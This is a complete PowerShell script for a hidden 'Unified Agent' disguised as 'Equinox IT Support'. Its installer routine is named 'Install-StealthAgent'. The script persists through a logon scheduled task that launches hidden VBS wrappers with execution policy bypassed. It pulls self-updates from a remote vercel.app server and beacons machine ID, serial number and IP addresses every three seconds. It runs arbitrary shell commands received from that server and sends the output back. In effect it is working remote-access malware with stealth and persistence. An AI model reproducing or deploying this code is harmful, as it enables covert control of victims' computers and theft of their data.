param(
    [string]$ServerUrl = "https://unified-manager-q8xuknqq-wiandu-randts-projects.vercel.app",
    [switch]$Install
)

# Version: 1.6.5
# Description: Extreme-Compat User-Mode Agent with stable ID detection.

# 1. ENVIRONMENT SANITATION
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12"
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "Stop"
$InstallDir = "$env:LOCALAPPDATA\UnifiedAgent"
$LogFile = "$InstallDir\agent.log"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"
$SupportLogo = "Equinox-Logo-Transparent.png"

function Log-Message {
    param($Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    if ($LogFile) {
        try {
            if (-not (Test-Path (Split-Path $LogFile))) { New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null }
            $Line | Out-File -FilePath $LogFile -Append -Encoding utf8
        } catch {}
    }
}

# 2. GHOST KILLER (User-Mode)
try {
    Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | ForEach-Object { 
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue 
    }
} catch {}

# 3. ROBUST INSTALLATION LOGIC
function Install-StealthAgent {
    try {
        Log-Message "Initiating User-Level Persistent Install v1.6.5..."
        $TaskName = "UEA_Support_Persistence"
        Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        
        if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
        
        Log-Message "Deploying binary..."
        $SourceFile = if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) { $PSCommandPath } else { "$InstallDir\temp_agent.ps1" }
        
        if ($SourceFile -match "temp_agent.ps1") {
            (New-Object System.Net.WebClient).DownloadFile("$ServerUrl/api/agent/update", "$SourceFile")
        }

        Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
        
        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.5" }
        $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
        
        $VbsMainPath = "$InstallDir\uea_stealth.vbs"
        $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
        $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii

        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
        
        Start-ScheduledTask -TaskName $TaskName | Out-Null
        Log-Message "User-Mode v1.6.5 Active."
        if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
            exit
        }
    } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
}

# 4. MAIN LOOP
try {
    if ($Install) {
        Install-StealthAgent
    }

    # Stable ID detection (Registry is faster and more reliable than CIM if CIM hangs)
    $AgentId = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { 
        try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { "$($env:COMPUTERNAME)" }
    }
    $SerialNumber = try { (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -ErrorAction Stop).SystemSerialNumber } catch { "Unknown" }
    
    $TaskName = "UEA_Support_Persistence"
    $TaskStatus = try { Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch { $null }
    
    if (($PSCommandPath -ne $ScriptPath) -or ($null -eq $TaskStatus)) {
        Install-StealthAgent
    }

    if (Test-Path $ConfigPath) {
        $SavedConfig = try { Get-Content $ConfigPath | ConvertFrom-Json } catch { $null }
        if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
    }

    Log-Message "Agent v1.6.5 Started. ID: $AgentId"
    while ($true) {
        try {
            $OSInfo = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop).ProductName } catch { "Windows Endpoint" }
            $PubIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip } catch { "Unknown" }
            # FORCE IPv4 ONLY
            $LocIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress } catch { "Unknown" }
            
            $Payload = @{
                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.6.5"; status = "online"
                deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $PubIp; localIp = $LocIp; isp = "Enterprise"
            }
            $BodyJson = $Payload | ConvertTo-Json
            $Response = Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json"

            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.5")) {
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                Install-StealthAgent
                $VbsRestart = "$InstallDir\restart.vbs"
                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
                exit
            }

            foreach ($cmd in $Response.commands) {
                try {
                    $Result = ""
                    if ($cmd.type -eq "Message") {
                        $msgContent = $cmd.payload.message
                        $PopupScript = "$InstallDir\popup.ps1"
                        $PopupCode = @"
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
`$Form = New-Object Windows.Forms.Form
`$Form.Text = 'Equinox IT Support'
`$Form.Size = New-Object Drawing.Size(520,300)
`$Form.StartPosition = 'CenterScreen'
`$Form.TopMost = `$true
`$Form.FormBorderStyle = 'FixedDialog'
`$Form.BackColor = [System.Drawing.Color]::White
`$IconBox = New-Object Windows.Forms.PictureBox
`$IconBox.Size = New-Object Drawing.Size(80, 80)
`$IconBox.Location = New-Object Drawing.Point(20, 30)
`$IconBox.SizeMode = 'Zoom'
`$LogoUrl = "$ServerUrl/$SupportLogo"
try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData(`$LogoUrl); `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length))) } catch { }
`$Header = New-Object Windows.Forms.Label
`$Header.Text = 'EQUINOX IT SUPPORT'
`$Header.ForeColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Header.Font = New-Object Drawing.Font('Segoe UI', 14, [System.Drawing.FontStyle]::Bold)
`$Header.Location = New-Object Drawing.Point(120, 30)
`$Header.Size = New-Object Drawing.Size(350, 30)
`$Disclaimer = New-Object Windows.Forms.Label
`$Disclaimer.Text = '*** OFFICIAL COMPANY COMMUNICATION ***'
`$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
`$Disclaimer.ForeColor = [System.Drawing.Color]::FromArgb(2, 132, 199)
`$Disclaimer.Location = New-Object Drawing.Point(120, 60)
`$Disclaimer.Size = New-Object Drawing.Size(350, 20)
`$Content = New-Object Windows.Forms.Label
`$Content.Text = "$msgContent"
`$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
`$Content.Location = New-Object Drawing.Point(120, 95)
`$Content.Size = New-Object Drawing.Size(360, 80)
`$Legal = New-Object Windows.Forms.Label
`$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
`$Legal.Font = New-Object Drawing.Font('Segoe UI', 7, [System.Drawing.FontStyle]::Italic)
`$Legal.ForeColor = [System.Drawing.Color]::Gray
`$Legal.Location = New-Object Drawing.Point(20, 250)
`$Legal.Size = New-Object Drawing.Size(480, 15)
`$Button = New-Object Windows.Forms.Button
`$Button.Text = 'Acknowledge'
`$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
`$Button.Size = New-Object Drawing.Size(180, 45)
`$Button.Location = New-Object Drawing.Point(300, 190)
`$Button.BackColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Button.ForeColor = [System.Drawing.Color]::White
`$Button.FlatStyle = 'Flat'
`$Button.Add_Click({ `$Form.Close() })
`$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Legal, `$Button))
`$Form.ShowDialog() | Out-Null
"@
                        $PopupCode | Out-File -FilePath $PopupScript -Force -Encoding utf8
                        $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                        if ($ActiveUser) {
                            $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
                            "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
                            $SupportTaskName = "UEA_Support_Msg_$(Get-Random)"
                            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
                            try {
                                $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action -Principal $Principal | Out-Null
                            } catch {
                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action | Out-Null
                            }
                            Start-ScheduledTask -TaskName $SupportTaskName | Out-Null
                            Start-Sleep -Seconds 5
                            Unregister-ScheduledTask -TaskName $SupportTaskName -Confirm:$false | Out-Null
                        }
                    } elseif ($cmd.type -eq "shell") {
                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                    }
                    if ($Result) {
                        $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body ($ResultPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                    }
                } catch { Log-Message "Cmd Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
            }
        } catch { Log-Message "Loop Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
        Start-Sleep -Seconds 3
    }
} catch { Log-Message "Fatal at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
